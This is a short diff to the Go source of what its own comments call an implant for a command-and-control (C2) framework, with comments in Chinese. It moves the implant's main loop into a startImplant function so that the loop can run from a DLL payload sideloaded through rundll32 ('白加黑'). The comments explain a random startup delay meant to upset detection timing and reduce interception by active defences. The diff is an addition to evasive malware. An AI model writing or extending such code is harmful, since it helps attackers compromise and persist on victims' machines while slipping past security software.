@@ -281,7 +281,15 @@ func loadConfigFromSelf() *implantConfig {
 	return &cfg
 }
 
-func main() {
+// startImplant 植入端主流程（连上 C2 后进入心跳/任务循环，正常情况下不返回）。
+//
+// 单独抽出来是为了 **DLL 载荷**（format=dll，白加黑 / rundll32 侧加载）：
+// c-shared 模式下 Go 不会调用 main()，由生成的 cgo 胶水在 DLL 加载或宿主调用导出
+// 函数时 `go startImplant()` 起一个独立线程跑同一套逻辑（见 builder 的 dll.go）。
+//
+// 注意：整个流程第一件事就是"启动随机延迟"的休眠，这同时保证了**不会在 DLL 加载
+// 的 loader lock 里做重活**（联网/建线程都发生在休眠之后的普通线程上），这是刻意设计。
+func startImplant() {
 	// 启动默认随机延迟：先休眠 [startupDelayMin, startupDelayMax] 秒（构建期配置，默认 5~30s），
 	// 打乱"启动即连/即行为"的检测节奏，降低主动防御在启动阶段的拦截概率。
 	if startupDelayMax >= startupDelayMin && startupDelayMin > 0 {
